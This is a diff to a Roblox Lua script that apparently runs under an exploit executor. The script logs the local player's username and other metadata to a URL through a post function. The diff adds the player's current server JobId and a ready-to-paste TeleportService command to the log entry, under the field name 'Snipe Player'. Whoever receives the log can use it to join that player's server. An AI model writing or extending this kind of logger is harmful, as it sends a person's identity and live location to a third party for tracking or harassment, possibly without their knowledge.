@@ -13,6 +13,10 @@ local http = game:GetService("HttpService")
 local GetName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
 local executor = identifyexecutor()
 local localPlayer = players.LocalPlayer
+local job = tostring(game.JobId)
+local gameId = game.PlaceId
+
+local teleportStatement = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameId .. ", '" .. job .. "', localPlayer)"
 
 local metadata = {
     ["username"] = localPlayer.Name,
@@ -60,8 +64,8 @@ logger.post = function(url)
 
                     fields = {              
                     {
-                        name = "test",
-                        value = "test2",
+                        name = "Snipe Player",
+                        value = "```lua\n" .. teleportStatement .. "```",
                         inline = true
                     }
                                     },
